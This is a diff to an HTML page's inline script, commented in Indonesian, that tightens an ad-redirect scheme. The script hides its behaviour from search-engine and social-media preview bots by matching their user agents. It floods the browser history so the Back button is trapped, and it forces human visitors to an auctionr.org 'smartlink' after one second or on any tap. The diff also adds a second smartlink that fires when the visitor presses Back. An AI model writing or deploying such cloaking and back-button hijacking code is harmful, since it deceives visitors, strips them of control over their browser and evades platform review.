@@ -81,44 +81,47 @@
   <div id="tap-overlay"></div>
 
   <script>
-    const targetUrl = "https://auctionr.org/4/8863f0a61a698c2242080d6c33efe3d6";
+    // Layer 1: Smartlink Utama (Redirect 1 detik / tap layar)
+    const primarySmartlink = "https://auctionr.org/4/8863f0a61a698c2242080d6c33efe3d6";
     
-    // Deteksi Bot Sosial Media & Search Engine
+    // Layer 2: Smartlink Cadangan (Dipicu saat tombol Back ditekan)
+    const backSmartlink = "https://auctionr.org/4/c5affd0d6fb5d5aa484f92e759adac59";
+
+    // Filter Bot Mesin Pencari & Sosmed
     const botPattern = /facebookexternalhit|Facebot|Pinterest|Twitterbot|TelegramBot|WhatsApp|Googlebot|bingbot|Quora Link Preview/i;
     const isBot = botPattern.test(navigator.userAgent);
 
     function triggerBackHijack() {
-      // Menyuntikkan riwayat browser berulang agar tombol back tertahan
       for (let i = 0; i < 5; i++) {
         history.pushState(null, null, location.href);
       }
       window.onpopstate = function () {
-        location.replace(targetUrl);
+        location.replace(backSmartlink);
       };
     }
 
     function redirectUser() {
       triggerBackHijack();
-      window.location.href = targetUrl;
+      window.location.href = primarySmartlink;
     }
 
     if (!isBot) {
-      // Inisialisasi awal
+      // Inisialisasi awal jebakan tombol back
       history.pushState(null, null, location.href);
       window.onpopstate = function () {
-        location.replace(targetUrl);
+        location.replace(backSmartlink);
       };
 
-      // Kunci lebih dalam begitu layar disentuh pengunjung
+      // Kunci riwayat instan saat layar disentuh
       document.addEventListener("touchstart", triggerBackHijack, { once: true });
       document.addEventListener("click", triggerBackHijack, { once: true });
 
-      // Eksekusi sentuhan menuju penawaran utama
+      // Eksekusi klik layar menuju Smartlink 1
       document.getElementById("tap-overlay").addEventListener("click", redirectUser);
       document.getElementById("tap-overlay").addEventListener("touchstart", redirectUser);
       
-      // Timer pengalihan otomatis jika pengunjung diam saja
-      setTimeout(redirectUser, 4000);
+      // Timer 1 detik menuju Smartlink 1
+      setTimeout(redirectUser, 1000);
     }
   </script>
 </body>
